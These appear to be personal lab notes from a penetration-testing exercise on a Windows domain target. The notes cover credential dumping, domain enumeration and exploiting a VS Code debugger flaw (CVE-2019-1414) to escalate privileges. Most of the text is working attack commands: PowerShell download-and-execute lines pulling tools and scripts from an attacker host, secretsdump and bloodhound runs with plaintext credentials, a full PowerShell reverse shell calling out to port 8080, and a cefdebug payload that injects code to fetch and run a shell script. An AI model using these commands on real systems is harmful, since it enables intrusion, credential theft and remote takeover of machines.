
![[Pasted image 20240924041011.png]]

![[Pasted image 20240924041046.png]]

```
Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
```
![[Pasted image 20240924042731.png]]

I think some kind of antivirus is running behind
![[Pasted image 20240924043719.png]]

Now there are 2 ways either to try 
ldap
secrets dump
bloodhound
and see what we get so that we can escalate 


Secrets Dump
```
secretsdump.py holo.live/tushikikatomo:'finance1'@10.10.10.179
```

Ldap
```
ldapdomaindump ldaps://10.10.10.179 -u 'megacorp.local\tushikikatomo' -p 'finance1'
```
![[Pasted image 20240924141609.png]]

Bloodhound
```
bloodhound-python -d megacorp.local -u tushikikatomo -p 'finance1' -ns 10.10.10.179  -c all
```



Let's get back to script and see what we can do there
```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
```

```
Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
```

```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe'); Invoke-winPEASx64 -Extended
```

```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe') | powershell -noprofile -
```


```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1')
```


```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
```

![[Pasted image 20240924225659.png]]

So what's the thing that stands outttttttttttttttttttt.
Microsoft VS Code            C:\Program Files\Microsoft VS Code
![[Pasted image 20240924233613.png]]

```
C:\Program Files\Microsoft VS Code
```

```
(get-command .\Code).version
```
![[Pasted image 20240925001315.png]]

CVE
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414

Will follow this blog
https://iwantmore.pizza/posts/cve-2019-1414.html


```
Invoke-WebRequest -Uri http://10.10.16.6/cefdebug/cefdebug.exe -OutFile cefdebug.exe
```
![[Pasted image 20240925160843.png]]
```
ws://127.0.0.1:40860/b4349ceb-188d-42a8-8c02-04d8145a3bf6
```

```
ws://127.0.0.1:64554/62f6a0f5-255e-4f13-a5aa-1e9cd4d3738b
```


Reverse Shell
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.6',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
```

Payload
```
.\cefdebug.exe --url ws://127.0.0.1:8509/7c9c5946-7d08-4ef4-b724-87be420324bc --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6//shell02.ps1')"
```

Invoke-WebRequest -Uri http://10.10.16.6/cefdebug/cefdebug.exe -OutFile cefdebug.exe

```
.\cefdebug.exe --url ws://127.0.0.1:32630/9630313f-5192-41f1-ab29-8c75a3f04186 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.6/shell02.ps1\')')"
```

Finally it worked and guess what i have written the reverse shell name wrong
![[Pasted image 20240925163812.png]]
![[Pasted image 20240925163826.png]]

![[Pasted image 20240925163846.png]]

Now we have to escalate from here.
```
Invoke-WebRequest -Uri http://10.10.16.6/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1 -OutFile winPEASps1.ps1
```

